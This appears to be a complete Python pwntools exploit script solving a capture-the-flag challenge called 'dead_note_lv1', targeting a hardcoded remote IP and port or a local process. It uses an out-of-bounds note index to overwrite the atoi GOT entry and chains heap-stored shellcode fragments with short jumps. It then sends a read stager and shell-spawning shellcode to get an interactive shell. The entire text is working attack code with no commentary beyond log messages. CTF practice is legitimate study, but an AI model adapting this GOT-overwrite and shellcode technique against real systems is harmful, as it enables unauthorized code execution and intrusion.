#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "159.89.197.67"
PORT = 3333

def add_note(idx, number, content):
	r.sendline("1")
	r.sendlineafter(": ", str(idx))
	r.sendlineafter(": ", str(number))
	r.sendafter(": ", content)
	r.recvuntil("Your choice: ")

def del_note(idx):
	r.sendline("2")
	r.sendlineafter(": ", str(idx))
	r.recvuntil("Your choice: ")

def exploit(r):
	context.arch = "amd64"

	# Jump to input shellcode
	SC = """
		push rsi
		ret
		"""

	payload = asm(SC)

	log.info("Create dummy note on heap")
	add_note(0, 1, "dum")
	counter = 1

	log.info("Write payload to heap")
	for ch in payload[1:]:
		add_note(counter, 1, "%c%s" % (ch, "\xeb\x1d"))
		counter += 1

	log.info("Remove dummy note and write first payload opcode to heap")
	del_note(0)

	dest = -(0x2020e0 - e.got["atoi"]) / 8
	add_note(dest, 1, "%c%s" % (payload[0], "\xeb\x1d"))

	log.info("Send stager shellcode as input to atoi")
	SC2 = """
		mov dl, 0xff
		xor rdi, rdi
		xor rax, rax
		syscall
	"""

	r.sendline(asm(SC2))

	log.info("Send sh() shellcode to trigger shell")
	payload = "A"*11
	payload += asm(shellcraft.amd64.sh())

	r.sendline(payload)

	r.interactive()

	return

if __name__ == "__main__":
	e = ELF("./dead_note_lv1")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process("./dead_note_lv1")
		print util.proc.pidof(r)
		pause()
		exploit(r)
